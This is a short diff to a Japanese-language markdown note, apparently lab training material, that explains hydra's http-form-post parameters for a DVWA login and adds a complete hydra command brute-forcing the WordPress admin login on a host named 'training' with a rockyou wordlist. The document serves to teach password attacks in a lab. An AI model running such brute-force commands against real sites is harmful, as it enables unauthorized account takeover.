@@ -23,3 +23,8 @@
 | `:username=^USER^&password=^PASS^&Login=Login`           | クエリストリングの^USER^,^PASS^が変数に相当 |
 | `:H=Cookie: PHPSESSID=セッションID;security=low`         | リクエストのヘッダ(Cookie)                  |
 | `:F=Username and/or password incorrect."`                | ログイン失敗時のメッセージ |
+
+``` shell
+    #wordpressへのブルートフォース
+     sudo hydra training -s 80 -l admin -P /home/student/rockyou_mini.txt http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:incorrect"
+```
